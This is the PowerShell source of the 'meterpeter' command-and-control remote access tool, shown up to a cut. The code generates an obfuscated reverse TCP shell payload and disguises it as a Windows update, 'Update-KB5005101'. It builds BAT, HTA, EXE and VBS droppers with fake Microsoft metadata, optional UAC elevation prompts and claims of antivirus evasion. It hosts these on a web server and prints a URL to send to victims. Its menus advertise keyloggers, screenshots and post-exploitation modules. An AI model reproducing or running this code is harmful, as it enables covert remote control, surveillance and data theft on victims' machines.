##
#   Author: @r00t-3xp10it (ssa redteam)
#   Tested Under: Windows 10 (19044) x64 bits
#   Required Dependencies: Invoke-WebRequest
#   Optional Dependencies: BitsTransfer|Python
#   PS cmdlet Dev version: v2.10.13
#   PS cmdlet sub version: v2.10.13.5
#   GitHub: https://github.com/r00t-3xp10it/meterpeter/releases
##

$SserverTime = Get-Date -Format "dd/MM/yyyy HH:mm:ss"
$HTTP_PORT = "8087"                 # Python http.server LPort (optional)
$CmdLetVersion = "2.10.13"          # meterpeter C2 version (dont change)
$DeveloVersion = "2.10.13.4"        # meterpeter C2 dev version (dont change)
$payload_name = "Update-KB5005101"  # Client-payload filename (dont change)
$Dropper_Name = "Update-KB5005101"  # Payload-dropper filename (optional)

$EndBanner = @"

  __  __  ____  _____  ____  ____  ____  ____  _____  ____  ____ 
 |  \/  || ===||_   _|| ===|| () )| ()_)| ===||_   _|| ===|| () )
 |_|\/|_||____|  |_|  |____||_|\_\|_|   |____|  |_|  |____||_|\_\
 Author: @ZHacker13 &('r00t-3xp10it') - SSA_redteam @2023 V${CmdLetVersion}
 Date: $SserverTime - Cmdlet subdevelop version: $DeveloVersion
"@;

$StartBanner = @"

  __  __  ____  _____  ____  ____  ____  ____  _____  ____  ____ 
 |  \/  || ===||_   _|| ===|| () )| ()_)| ===||_   _|| ===|| () )
 |_|\/|_||____|  |_|  |____||_|\_\|_|   |____|  |_|  |____||_|\_\
 Author: @ZHacker13 &('r00t-3xp10it') - SSA_redteam @2023 V${CmdLetVersion}

 Meterpeter its a command & control (C2) remote access tool (rat)
 written in pure powershell released to windows (python3 required)
 or to linux (powershell and apache2 required) distros. It creates
 reverse_tcp_shell payloads (pure powershell + sockets) obfuscated
 in BXOR using a secret key and also creates one dropper file that
 allow users to fast deliver the payload on LAN networks for tests.
"@;

$Modules = @"

  __  __  ____  _____  ____  ____  ____  ____  _____  ____  ____ 
 |  \/  || ===||_   _|| ===|| () )| ()_)| ===||_   _|| ===|| () )
 |_|\/|_||____|  |_|  |____||_|\_\|_|   |____|  |_|  |____||_|\_\
 Author: @ZHacker13 &('r00t-3xp10it') - SSA_redteam @2023 V${CmdLetVersion}


  Command      Description
  -------      ------------------------------
  Info         Remote host system information
  Session      Meterpeter C2 connection status
  AdvInfo      Advanced system information sub-menu
  Upload       Upload from local host to remote host
  Download     Download from remote host to local host
  Screenshot   Capture remote host desktop screenshots
  keylogger    Install remote host keyloggers sub-menu
  PostExploit  Post Exploitation modules sub-menu
  NetScanner   Local LAN network scanner sub-menu
  Pranks       Prank remote host modules sub-menu
  exit         Exit rev_tcp_shell [server+client]


"@;


try{#Check http.server
   $MyServer = python -V
   If(-not($MyServer) -or $MyServer -eq $null)
   {
      $strMsg = "Warning: python (http.server) not found in current system." + "`n" + "  'Install python (http.server) to deliver payloads on LAN'.."
      powershell (New-Object -ComObject Wscript.Shell).Popup($strMsg,10,'Deliver Meterpeter payloads on LAN',0+48)|Out-Null
   }
   Else
   {
      $PInterpreter = "python"
   }
}Catch{
   powershell (New-Object -ComObject Wscript.Shell).Popup("python interpreter not found ...",6,'Deliver Meterpeter payloads on LAN',0+48)|Out-Null
}


function Char_Obf($String){

  $String = $String.toCharArray();  
  ForEach($Letter in $String)
  {
    $RandomNumber = (1..2) | Get-Random;
    
    If($RandomNumber -eq "1")
    {
      $Letter = "$Letter".ToLower();
    }

    If($RandomNumber -eq "2")
    {
      $Letter = "$Letter".ToUpper();
    }

    $RandomString += $Letter;
    $RandomNumber = $Null;
  }
  
  $String = $RandomString;
  Return $String;
}

function msaudite($String){

  $finalcmdline = "ASC" + "II" -join ''
  $PowerShell = "I`E`X(-Jo" + "in((@)|%{[char](`$_-BX" + "OR #)}));Exit" -join ''
  $Key = '0x' + ((0..5) | Get-Random) + ((0..9) + ((65..70) + (97..102) | % {[char]$_}) | Get-Random);Start-Sleep -Milliseconds 30
  (  '!'|%  {${~ }=  +$()}{  ${ /'}=${~ }}  {${) }  =  ++  ${~ }}{  ${;.*}=(  ${~ }=${~ }+  ${) })  }{  ${)#+}  =(${~ }  =  ${~ }  +  ${) }  )}  {  ${~(}=(${~ }=  ${~ }  +  ${) }  )  }{  ${*-}=  (${~ }  =${~ }+${) })}{${()``}=(${~ }=  ${~ }  +  ${) }  )}  {${]/!}=  (  ${~ }  =  ${~ }  +  ${) })}  {${# }  =  (${~ }  =  ${~ }+  ${) }  )  }{${*;}  =  (${~ }=  ${~ }+  ${) }  )}  {${/}  ="["+  "$(@{  })"[  ${]/!}  ]+  "$(@{  })"["${) }${*;}"]+  "$(  @{  }  )"[  "${;.*}${ /'}"]+"$?  "[  ${) }  ]  +  "]"  }{${~ }  =  "".("$(@{})  "["${) }${~(}"  ]+"$(  @{  })  "["${) }${()``}"]+"$(  @{  })  "[  ${ /'}]  +  "$(  @{  }  )"[  ${~(}  ]+  "$?  "[  ${) }]+  "$(@{  }  )"[${)#+}]  )  }  {  ${~ }="$(@{})"[  "${) }${~(}"]  +"$(@{  })"[  ${~(}  ]+  "${~ }"[  "${;.*}${]/!}"  ]  }  )  ;  .${~ }(  "  ${/}${)#+}${()``}+  ${/}${# }${)#+}+  ${/}${) }${) }${()``}+${/}${) }${) }${~(}  +${/}${) }${ /'}${*-}+${/}${) }${) }${ /'}  +  ${/}${) }${ /'}${)#+}  +${/}${)#+}${;.*}  +  ${/}${()``}${) }+  ${/}${)#+}${;.*}  +${/}${)#+}${()``}+  ${/}${~(}${ /'}  +  ${/}${*;}${) }+${/}${# }${)#+}  +  ${/}${) }${;.*}${) }+  ${/}${) }${) }${*-}+${/}${) }${) }${()``}  +  ${/}${) }${ /'}${) }+  ${/}${) }${ /'}${*;}+${/}${~(}${()``}  +  ${/}${# }${~(}+${/}${) }${ /'}${) }+  ${/}${) }${;.*}${ /'}+${/}${) }${) }${()``}+${/}${~(}${()``}  +${/}${()``}${*;}  +${/}${) }${) }${ /'}  +  ${/}${*;}${*;}  +  ${/}${) }${) }${) }  +  ${/}${) }${ /'}${ /'}  +${/}${) }${ /'}${*-}  +${/}${) }${) }${ /'}+  ${/}${) }${ /'}${)#+}+  ${/}${*;}${)#+}+  ${/}${*-}${# }+${/}${*-}${# }  +  ${/}${)#+}${()``}+  ${/}${) }${ /'}${;.*}  +  ${/}${) }${ /'}${*-}  +  ${/}${) }${) }${ /'}  +  ${/}${*;}${]/!}  +${/}${) }${ /'}${# }  +${/}${*;}${*;}+${/}${) }${ /'}${*;}  +  ${/}${) }${ /'}${ /'}+  ${/}${) }${ /'}${# }+${/}${) }${ /'}${*-}+${/}${) }${) }${ /'}  +${/}${) }${ /'}${) }+  ${/}${~(}${()``}+  ${/}${]/!}${) }+  ${/}${) }${ /'}${) }+${/}${) }${) }${()``}+${/}${()``}${()``}  +  ${/}${) }${;.*}${) }  +  ${/}${) }${) }${()``}+  ${/}${) }${ /'}${) }+  ${/}${) }${) }${*-}+  ${/}${~(}${ /'}  +${/}${)#+}${()``}+${/}${# }${)#+}  +${/}${) }${) }${()``}  +${/}${) }${) }${~(}  +  ${/}${) }${ /'}${*-}+${/}${) }${) }${ /'}  +  ${/}${) }${ /'}${)#+}+${/}${~(}${) }+  ${/}${) }${;.*}${~(}+  ${/}${)#+}${]/!}+${/}${) }${;.*}${)#+}  +${/}${)#+}${()``}+  ${/}${*;}${*-}+  ${/}${)#+}${;.*}+${/}${~(}${*-}  +${/}${()``}${()``}  +${/}${# }${# }  +${/}${]/!}${*;}  +  ${/}${# }${;.*}+${/}${)#+}${;.*}  +${/}${)#+}${()``}  +${/}${]/!}${*-}  +  ${/}${) }${ /'}${) }+${/}${) }${;.*}${) }  +  ${/}${) }${;.*}${*-}  +  ${/}${~(}${) }+  ${/}${)#+}${;.*}  +  ${/}${~(}${*-}  +${/}${) }${ /'}${()``}  +${/}${) }${) }${) }  +  ${/}${) }${ /'}${*-}+  ${/}${) }${) }${ /'}  +  ${/}${)#+}${;.*}+  ${/}${)#+}${*;}+${/}${~(}${~(}+${/}${)#+}${*;}|${~ }")
  
  $PowerShell = Char_Obf($PowerShell);$PowerShell = $PowerShell -replace "@","$String";$PowerShell = $PowerShell -replace "#","$Key";
  $CMD = "hello world";$CMD = Char_Obf($CMD);$CMD = $CMD -replace "@","$String";$CMD = $CMD -replace "#","$Key";

  Return $PowerShell,$CMD;
}

function ChkDskInternalFuncio($String){

  $RandomVariable = (0..99);
  For($i = 0; $i -lt $RandomVariable.count; $i++){

    $Temp = (-Join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}));

    While($RandomVariable -like "$Temp"){
      $Temp = (-Join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}));
    }

    $RandomVariable[$i] = $Temp;
    $Temp = $Null;
  }

  $RandomString = $String;

  For($x = $RandomVariable.count; $x -ge 1; $x--){
  	$Temp = $RandomVariable[$x-1];
    $RandomString = "$RandomString" -replace "\`$$x", "`$$Temp";
  }

  $String = $RandomString;
  Return $String;
}

function NetworkStats($IP,$Port,$Base64_Key){

  [int]$Signature = Get-Random -Minimum 1 -Maximum 3
  $dadoninho = "Fr`omB" + "ase`6" + "4Str`ing" -Join ''
  $deskmondll = "`$mscorelib='1'+'024' -Join '';`$MicrosoftAccountCloudAP='Cre'+'ateIn'+'stance' -join '';powershell (New-Object -ComObject Wscript.Shell).Popup('Security update installed.',$Signature,'KB5005101 21H1',0+0);`$3=`"#`";`$1=[System.Byte[]]::`$MicrosoftAccountCloudAP([System.Byte],`$mscorelib);Get-Date|Out-File bios.log;`$filemgmtdll='FromB'+'ase6'+'4String' -Join '';`$2=([Convert]::`$filemgmtdll(`"@`"));`$4=I``E``X([System.Runtime.Int"+"eropServices.Marshal]::PtrToStr"+"ingAuto([System.Runtime.InteropSe"+"rvices.Marshal]::SecureStringToBSTR((`$3|ConvertTo-SecureString -Key `$2))));While(`$5=`$4.GetStream()){;While(`$5.DataAvailable -or `$6 -eq `$1.count){;`$6=`$5.Read(`$1,0,`$1.length);`$7+=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$1,0,`$6)};If(`$7){;`$8=(I``E``X(`$7)2>&1|Out-String);If(!(`$8.length%`$1.count)){;`$8+=`" `"};`$9=([text.encoding]::ASCII).GetBytes(`$8);`$5.Write(`$9,0,`$9.length);`$5.Flush();`$7=`$Null}}";

  $Key = $([System.Convert]::$dadoninho($Base64_Key))
  #$NewKey = (3,4,2,3,56,34,254,222,1,1,2,23,42,54,33,233,1,34,2,7,6,5,35,43)
  $C2 = ConvertTo-SecureString "New-Object System.Net.Sockets.TCPClient('$IP','$Port')" -AsPlainText -Force | ConvertFrom-SecureString -Key $Key;

  $deskmondll = ChkDskInternalFuncio(Char_Obf($deskmondll));
  $deskmondll = $deskmondll -replace "@","$Base64_Key";
  $deskmondll = $deskmondll -replace "#","$C2";

  Return $deskmondll;
}

Clear-Host;
Write-Host $StartBanner
write-host "      * GitHub: https://github.com/r00t-3xp10it/meterpeter *`n`n" -ForegroundColor DarkYellow
$DISTRO_OS = pwd|Select-String -Pattern "/" -SimpleMatch; # <-- (check IF windows|Linux Separator)
If($DISTRO_OS)
{
   ## Linux Distro
   $IPATH = "$pwd/"
   $Flavor = "Linux"
   $Bin = "$pwd/mimiRatz/"
   $APACHE = "/var/www/html/"
}Else{
   ## Windows Distro
   $IPATH = "$pwd\"
   $Flavor = "Windows"
   $Bin = "$pwd\mimiRatz\"
   $APACHE = "$env:LocalAppData\webroot\"
}

$Obfuscation = $null
## User Input Land ..
Write-Host "Input Local Host: " -NoNewline;
$LHOST = Read-Host;
$Local_Host = $LHOST -replace " ","";
Write-Host "Input Local Port: " -NoNewline;
$LPORT = Read-Host;
$Local_Port = $LPORT -replace " ","";

## Default settings
If(-not($Local_Port)){$Local_Port = "666"};
If(-not($Local_Host)){
   If($DISTRO_OS){
      ## Linux Flavor
      $Local_Host = ((ifconfig | grep [0-9].\.)[0]).Split()[-1]
   }else{
      ## Windows Flavor
      $Local_Host = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
   }
}

If($Flavor -ieq "Windows")
{
   Write-Host "`n`n* Payload dropper format sellection!" -ForegroundColor Black -BackgroundColor Gray
   Write-Host "Id DropperFileName        Format  AVDetection  UacElevation  PsExecutionBypass" -ForegroundColor Green
   Write-Host "-- --------------------   ------  -----------  ------------  -----------------"
   Write-Host "1  Update-KB5005101.bat   BAT     Undetected   optional      true"
   Write-Host "2  Update-KB5005101.hta   HTA     Undetected   false         true"
   Write-Host "3  Update-KB5005101.exe   EXE     Undetected   optional      true" -ForegroundColor Yellow
   Write-Host "4  Update-KB5005101.vbs   VBS     Undetected   optional      true" -ForegroundColor DarkGray
   $FlavorSellection = Read-Host "Id"
}
ElseIf($Flavor -ieq "Linux")
{
   Write-Host "`n`n* Payload dropper format sellection!" -ForegroundColor Black -BackgroundColor Gray
   Write-Host "Id DropperFileName       Format  AVDetection  UacElevation  PsExecutionBypass" -ForegroundColor Green
   Write-Host "-- --------------------  ------  -----------  ------------  -----------------"
   Write-Host "1  Update-KB5005101.bat  BAT     Undetected   optional      true"
   Write-Host "2  Update-KB5005101.hta  HTA     Undetected   false         true"
   $FlavorSellection = Read-Host "Id"
}
## End Of venom Function ..


$viriatoshepard = ("T@oB@a" + "s@e6@4St@" + "r@i@n@g" -join '') -replace '@',''
$Key = (1..32 | % {[byte](Get-Random -Minimum 0 -Maximum 255)});
$Base64_Key = $([System.Convert]::$viriatoshepard($Key));

Write-Host "`n[*] Generating Payload ✔";
$deskmondll = NetworkStats -IP $Local_Host -Port $Local_Port -Base64_Key $Base64_Key;

Write-Host "[*] Obfuscation Type: BXOR ✔"
$deskmondll = msaudite($deskmondll);

Clear-Host;
Write-Host $StartBanner
write-host "      * GitHub: https://github.com/r00t-3xp10it/meterpeter *`n`n" -ForegroundColor DarkYellow
Write-Host " - Payload    : $payload_name.ps1"
Write-Host " - Local Host : $Local_Host"
Write-Host " - Local Port : $Local_Port"
Start-Sleep -Milliseconds 800

$PowerShell_Payload = $deskmondll[0];
$CMD_Payload = $deskmondll[1];

Write-Host "`n[*] PowerShell Payload:`n"
Write-Host "$PowerShell_Payload" -ForeGroundColor black -BackGroundColor white


write-host "`n`n"
$My_Output = "$PowerShell_Payload" | Out-File -FilePath $IPATH$payload_name.ps1 -Force;

## Better obfuscated IE`X system call
$ttl = ("I" + "@_`X" -Join '') -replace '@_','E'
#((Get-Content -Path $IPATH$payload_name.ps1 -Raw) -Replace "$ttl","Get-Date -Format 'HH:mm:ss'|Out-File bios.log;&(''.SubString.ToString()[67,72,64]-Join'')")|Set-Content -Path $IPATH$payload_name.ps1
((Get-Content -Path $IPATH$payload_name.ps1 -Raw) -Replace "$ttl","&('REX' -replace 'R','I')")|Set-Content -Path $IPATH$payload_name.ps1


$Server_port = "$Local_Host"+":"+"$HTTP_PORT";
$check = Test-Path -Path "/var/www/html/";
If($check -ieq $False)
{

  try{
     #Check Attacker python version (http.server)
     $Python_version = python -V
  }catch{}

  If($Python_version)
  {
    $Webroot_test = Test-Path -Path "$env:LocalAppData\webroot\";
    If($Webroot_test -ieq $True){cmd /R rmdir /Q /S "%LocalAppData%\webroot\";mkdir $APACHE|Out-Null}else{mkdir $APACHE|Out-Null};
    ## Attacker: Windows - with python3 installed
    # Deliver Dropper.zip using python http.server
    write-Host "   WebServer    Client                Dropper               WebRoot" -ForegroundColor Green;
    write-Host "   ---------    ------                -------               -------";
    write-Host "   Python3      Update-KB5005101.ps1  Update-KB5005101.zip  $APACHE";write-host "`n`n";
    Copy-Item -Path $IPATH$payload_name.ps1 -Destination $APACHE$payload_name.ps1 -Force

    If($FlavorSellection -eq 2)
    {
    
       <#
       .SYNOPSIS
          Author: @r00t-3xp10it
          Helper - meterpeter payload HTA dropper application
       #>

       cd $Bin
       #delete old files left behind by previous executions
       If(Test-Path -Path "$Dropper_Name.hta" -EA SilentlyContinue)
       {
          Remove-Item -Path "$Dropper_Name.hta" -Force
       }

       #Make sure HTA template exists before go any further
       If(-not(Test-Path -Path "Update.hta" -EA SilentlyContinue))
       {
          Write-Host "ERROR: file '${Bin}Update.hta' not found ..." -ForeGroundColor Red -BackGroundColor Black
          Write-Host "`n";exit #Exit @Meterpeter
       }
 
       #Replace the  server ip addr + port on HTA template
       ((Get-Content -Path "Update.hta" -Raw) -Replace "CharlieBrown","$Server_port")|Set-Content -Path "Update.hta"

       #Embebed meterpter icon on HTA application?
       #iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/theme/meterpeter.ico" -OutFile "meterpeter.ico"|Out-Null
       #Start-Process -WindowStyle hidden cmd.exe -ArgumentList "/R COPY /B meterpeter.ico+Update.hta $Dropper_Name.hta" -Wait

       Copy-Item -Path "Update.hta" -Destination "$Dropper_Name.hta" -Force
       #Compress HTA application and port the ZIP archive to 'webroot' directory!
       Compress-Archive -LiteralPath "$Dropper_Name.hta" -DestinationPath "${APACHE}${Dropper_Name}.zip" -Force

       #Revert original HTA to default to be used again
       ((Get-Content -Path "Update.hta" -Raw) -Replace "$Server_port","CharlieBrown")|Set-Content -Path "Update.hta"

       #Delete artifacts left behind
       #Remove-Item -Path "meterpeter.ico" -EA SilentlyContinue -Force
       Remove-Item -Path "$Dropper_Name.hta" -EA SilentlyContinue -Force

       #return to meterpeter working directory (meterpeter)
       cd $IPATH
    
    }
    ElseIf($FlavorSellection -eq 3)
    {
    
       <#
       .SYNOPSIS
          Author: @r00t-3xp10it
          Helper - meterpeter payload EXE dropper application
       #>

       cd $Bin
       $Dropper_Bat = "Update.ps1"
       $Dropper_Exe = "Update-KB5005101.exe"
       ((Get-Content -Path "$Dropper_Bat" -Raw) -Replace "CharlieBrown","$Server_port")|Set-Content -Path "$Dropper_Bat"

       #Download the required files from my GITHUB meterpeter repository!
       iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/PS2EXE/ps2exe.ps1" -OutFile "ps2exe.ps1"|Out-Null
       iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/PS2EXE/meterpeter.ico" -OutFile "meterpeter.ico"|Out-Null

       $RunEXElevated = Read-Host "[i] Make dropper spawn UAC dialog to run elevated? (y|n)"
       If($RunEXElevated -iMatch '^(y|yes)$')
       {
          .\ps2exe.ps1 -inputFile "$Dropper_Bat" -outputFile "$Dropper_Exe" -iconFile "meterpeter.ico" -title "Secure KB Update" -version "45.19041.692.2" -copyright "©Microsoft Corporation. All Rights Reserved" -product "KB5005101" -noError -noConsole -requireAdmin|Out-Null
          Start-Sleep -Seconds 2
       }
       Else
       {
          .\ps2exe.ps1 -inputFile "$Dropper_Bat" -outputFile "$Dropper_Exe" -iconFile "meterpeter.ico" -title "Secure KB Update" -version "45.19041.692.2" -copyright "©Microsoft Corporation. All Rights Reserved" -product "KB5005101" -noError -noConsole|Out-Null
          Start-Sleep -Seconds 2
       }

       #Compress EXE executable and port the ZIP archive to 'webroot' directory!
       Compress-Archive -LiteralPath "$Dropper_Exe" -DestinationPath "$APACHE$Dropper_Name.zip" -Force

       #Revert meterpeter EXE template to default state, after successfully created\compressed the binary dropper (PE)
       ((Get-Content -Path "$Dropper_Bat" -Raw) -Replace "$Server_port","CharlieBrown")|Set-Content -Path "$Dropper_Bat"

       #Clean all artifacts left behind by this function!
       Remove-Item -Path "meterpeter.ico" -EA SilentlyContinue -Force
       Remove-Item -Path "$Dropper_Exe" -EA SilentlyContinue -Force
       Remove-Item -Path "ps2exe.ps1" -EA SilentlyContinue -Force
       cd $IPATH
    
    }
    ElseIf($FlavorSellection -eq 4)
    {
    
       <#
       .SYNOPSIS
          Author: @r00t-3xp10it
          Helper - meterpeter payload VBS dropper application

       .NOTES
          This function accepts ip addresses from 11 to 14 chars (local)
          example: 192.168.1.1 (11 chars) to 192.168.101.122 (15 chars)

          The 'auto-elevation' function requires UAC enabled and runas.
       #>

       If(-not(Test-Path -Path "$IPATH\Download_Crandle.vbs" -EA SilentlyContinue))
       {
          ## Download crandle_builder.ps1 from my GitHub repository
          iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/crandle_builder.ps1" -OutFile "crandle_builder.ps1"|Unblock-File
       }

       #Evasion\Obfuscation
       $NumberOfChars = $Local_Host.length
       $SeconRange = $Server_port[5,6,7,8] -join ''                         # 68.1
       $FirstRange = $Server_port[0,1,2,3,4] -join ''                       # 192.1
       If($NumberOfChars -eq 11)
       {
          #Example: 192.168.1.7 + :8087 = 15 chars
          $trithRange = $Server_port[9,10,11,12,13,14,15] -join ''
       }
       ElseIf($NumberOfChars -eq 12)
       {
          #Example: 192.168.1.72 + 8087 = 16 chars
          $trithRange = $Server_port[9,10,11,12,13,14,15,16] -join ''       # .72:8087
       }
       ElseIf($NumberOfChars -eq 13)
       {
          #Example: 192.168.1.122 + 8087 = 17 chars
          $trithRange = $Server_port[9,10,11,12,13,14,15,16,17] -join ''     
       }
       ElseIf($NumberOfChars -eq 14)
       {
          #Example: 192.168.15.124 + 8087 = 18 chars
          $trithRange = $Server_port[9,10,11,12,13,14,15,16,17,18] -join ''     
       }
       ElseIf($NumberOfChars -eq 15)
       {
          #Example: 192.168.151.124 + 8087 = 19 chars
          $trithRange = $Server_port[9,10,11,12,13,14,15,16,17,18,19] -join ''     
       }

       $Crandle_Build = Read-Host "[i] Create (D)ownload or (F)ileless dropper script? (D|F)"
       If($Crandle_Build -iMatch '^(f|fileless)$')
       {
          $fuckOrNot = "fileless"
          $Technic = Read-Host "[i] Chose the FileLess Technic to add to crandle(1|2|3|4)"
       }
       Else
       {
          #Default (%tmp%)
          $fuckOrNot = "download"
       }

       If($Technic -Match '^(2)$')
       {
          $Technic = "two"       
       }
       ElseIf($Technic -Match '^(3)$')
       {
          $Technic = "three"       
       }
       ElseIf($Technic -Match '^(4)$')
       {
          $Technic = "four"       
       }
       Else
       {
          $Technic = "one"
       }


       $PayloadName = "$payload_name" + ".ps1" -join ''
       $RunEXElevated = Read-Host "[i] Make dropper spawn UAC dialog to run elevated ? (Y|N)"
       If($RunEXElevated -iMatch '^(y|yes)$')
       {
          <#
          .SYNOPSIS
             Author: @r00t-3xp10it
             Helper - Execute VBS with administrator privileges?

          .NOTES
             This function add's a cmdline to the beggining of the vbs script file
             that invokes 'runas' to spawn a UAC dialogbox to elevate appl privileges.

             None execution its achieved (crandler) if the target user does not
             accept to run the crandler with elevated privileges (UAC dialogBox)
          #>

          powershell -file crandle_builder.ps1 -action "$fuckOrNot" -VbsName "Download_Crandle.vbs" -PayloadName "$PayloadName" -UACElevation 'true' -Technic "$Technic" -Egg 'true'|Out-Null
       }
       Else
       {
          powershell -file crandle_builder.ps1 -action "$fuckOrNot" -VbsName "Download_Crandle.vbs" -PayloadName "$PayloadName" -UACElevation 'false' -Technic "$Technic" -Egg 'true'|Out-Null
       }

       #Replace the attacker ip addr (obfuscated\split) on vbs template
       ((Get-Content -Path "Download_Crandle.vbs" -Raw) -Replace "VIRIATO","$SeconRange")|Set-Content -Path "Download_Crandle.vbs"
       ((Get-Content -Path "Download_Crandle.vbs" -Raw) -Replace "COLOMBO","$FirstRange")|Set-Content -Path "Download_Crandle.vbs"
       ((Get-Content -Path "Download_Crandle.vbs" -Raw) -Replace "NAVIGATOR","$trithRange")|Set-Content -Path "Download_Crandle.vbs"

       #Download vbs_obfuscator from GitHub repository
       #iwr -uri https://raw.githubusercontent.com/DoctorLai/VBScript_Obfuscator/master/vbs_obfuscator.vbs -outfile vbs_obfuscator.vbs|Unblock-File

       #Obfuscate Program.vbs sourcecode.
       #cscript.exe vbs_obfuscator.vbs Download_Crandle.vbs > Buffer.vbs

       #Parse data
       $CrandleVbsName = "${Dropper_Name}" + ".vbs" -Join '' # Update-KB500101.vbs
       #$ObfuscatedData = Get-Content Buffer.vbs | Select-Object -Skip 3
       #echo $ObfuscatedData > $CrandleVbsName


       Start-sleep -Milliseconds 300
       #Change vbs crandle signature (add junk function)
       #[int]$Chars = Get-Random -Minimum 6 -Maximum 20 #Random variable length sellection! (from 6 => 20)
       #$RandVar = -join ((65..90) + (97..122) | Get-Random -Count $Chars | % {[char]$_}) #Random variable creation!
       #((Get-Content -Path "Download_Crandle.vbs" -Raw) -Replace "#REPLACEME","Dim reverse")|Set-Content -Path "$CrandleVbsName"

       #Compress VBS and port the ZIP archive to 'webroot' directory!
       Rename-Item -Path Download_Crandle.vbs -NewName $CrandleVbsName -Force


       ### COMPILE VBS TO EXE
       #C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe /target:exe /out:"$pwd\${Dropper_Name}.exe" "$pwd\${Dropper_Name}.vbs" /platform:anyCPU
       Compress-Archive -LiteralPath "$CrandleVbsName" -DestinationPath "${APACHE}${Dropper_Name}.zip" -Force
       #Move-Item -Path "$CrandleVbsName" -Destination "${APACHE}${Dropper_Name}.vbs" -Force

       #Clean all artifacts left behind
       Remove-Item -Path "Buffer.vbs" -EA SilentlyContinue -force
       Remove-Item -Path "vbs_obfuscator.vbs" -EA SilentlyContinue -force
       Remove-Item -Path "crandle_builder.ps1" -EA SilentlyContinue -force
       Remove-Item -Path "Download_Crandle.vbs" -EA SilentlyContinue -force
       Remove-Item -Path "$CrandleVbsName" -EA SilentlyContinue -force
    }
    Else
    {
    
       <#
       .SYNOPSIS
          Author: @r00t-3xp10it
          Helper - meterpeter payload BAT dropper script
       #>

       ## (ZIP + add LHOST) to dropper.bat before send it to apache 2 webroot ..
       Copy-Item -Path "$Bin$Dropper_Name.bat" -Destination "${Bin}BACKUP.bat"|Out-Null
       ((Get-Content -Path $Bin$Dropper_Name.bat -Raw) -Replace "CharlieBrown","$Server_port")|Set-Content -Path $Bin$Dropper_Name.bat

       $RunEXElevated = Read-Host "[i] Make dropper spawn UAC dialog to run elevated? (y|n)"
       If($RunEXElevated -iMatch '^(y|yes)$')
       {

          <#
          .SYNOPSIS
             Author: @r00t-3xp10it
             Helper - Execute Batch with administrator privileges?

          .NOTES
             This function add's a cmdline to the beggining of bat file that uses
             'Net Session' API to check for admin privs before executing powershell
             -runas on current process spawning a UAC dialogbox of confirmation.
          #>

          #TODO: run bat with admin privs ??? -> requires LanManServer (server) service active
          ((Get-Content -Path $Bin$Dropper_Name.bat -Raw) -Replace "@echo off","@echo off`nsc query `"lanmanserver`"|find `"RUNNING`" >nul`nif %ERRORLEVEL% EQU 0 (`n  Net session >nul 2>&1 || (PowerShell start -verb runas '%~0' &exit /b)`n)")|Set-Content -Path $Bin$Dropper_Name.bat
       }

       Compress-Archive -LiteralPath $Bin$Dropper_Name.bat -DestinationPath $APACHE$Dropper_Name.zip -Force
       #Revert original BAT to default to be used again
       Remove-Item -Path "$Bin$Dropper_Name.bat" -Force
       Copy-Item -Path "${Bin}BACKUP.bat" -Destination "$Bin$Dropper_Name.bat"|Out-Null
       Remove-Item -Path "${Bin}BACKUP.bat" -Force

    }

    write-Host "[i] Send the URL generated to target to trigger download.." -ForegroundColor DarkGray;
    Copy-Item -Path "${IPATH}\Mimiratz\theme\Catalog.png" -Destination "${APACHE}Catalog.png"|Out-Null
    Copy-Item -Path "${IPATH}\Mimiratz\theme\favicon.png" -Destination "${APACHE}favicon.png"|Out-Null
    Copy-Item -Path "${IPATH}\Mimiratz\theme\Update-KB5005101.html" -Destination "${APACHE}Update-KB5005101.html"|Out-Null
    ((Get-Content -Path "${APACHE}Update-KB5005101.html" -Raw) -Replace "henrythenavigator","$Dropper_Name")|Set-Content -Path "${APACHE}Update-KB5005101.html"

    Write-Host "[i] Attack Vector: http://$Server_port/$Dropper_Name.html" -ForeGroundColor Black -BackGroundColor white

    #tinyurl function
    powershell -file "${IPATH}\Mimiratz\shorturl.ps1" -ServerPort "$Server_port" -PayloadName "${Dropper_Name}.html"

    ## Start python http.server (To Deliver Dropper/Payload)
    Start-Process powershell.exe "write-host `" [http.server] Close this Terminal After receving the connection back in meterpeter ..`" -ForeGroundColor red -BackGroundColor Black;cd $APACHE;$PInterpreter -m http.server $HTTP_PORT --bind $Local_Host";
  }
  else
  {
    ## Attacker: Windows - without python3 installed
    # Manualy Deliver Dropper.ps1 To Target Machine
    write-Host "   WebServer      Client                Local Path" -ForegroundColor Green;
    write-Host "   ---------      ------                ----------";
    write-Host "   NotInstalled   Update-KB5005101.ps1  $IPATH";write-host "`n`n";
    Write-Host "[i] Manualy Deliver '$payload_name.ps1' (Client) to Target" -ForeGroundColor Black -BackGroundColor white;
    Write-Host "[*] Remark: Install Python3 (http.server) to Deliver payloads .." -ForeGroundColor yellow;
    Write-Host "[*] Remark: Dropper Demonstration $payload_name.bat created .." -ForeGroundColor yellow;

## Function for @Daniel_Durnea
# That does not have Python3 (http.server) installed to build Droppers (download crandles)
# This Demostration Dropper allow us to execute payload.ps1 in a hidden terminal windows ;)
$DemoDropper = @("#echo off
powershell (New-Object -ComObject Wscript.Shell).Popup(`"Executing $payload_name.ps1 payload`",4,`"$payload_name Security Update`",0+64)
powershell -WindowStyle hidden -File $payload_name.ps1
del `"%~f0`"")
echo $DemoDropper|Out-File "$payload_name.bat" -Encoding string -Force
((Get-Content -Path "$payload_name.bat" -Raw) -Replace "#","@")|Set-Content -Path "$payload_name.bat"

  }
}
else
{
  ## Attacker: Linux - Apache2 webserver
  # Deliver Dropper.zip using Apache2 webserver
  write-Host "   WebServer    Client                Dropper               WebRoot" -ForegroundColor Green;
  write-Host "   ---------    ------                -------               -------";
  write-Host "   Apache2      Update-KB5005101.ps1  Update-KB5005101.zip  $APACHE";write-host "`n`n";
  Copy-Item -Path $IPATH$payload_name.ps1 -Destination $APACHE$payload_name.ps1 -Force;

  If($FlavorSellection -eq 2)
  {
    
       <#
       .SYNOPSIS
          Author: @r00t-3xp10it
          Helper - meterpeter payload HTA dropper application
       #>

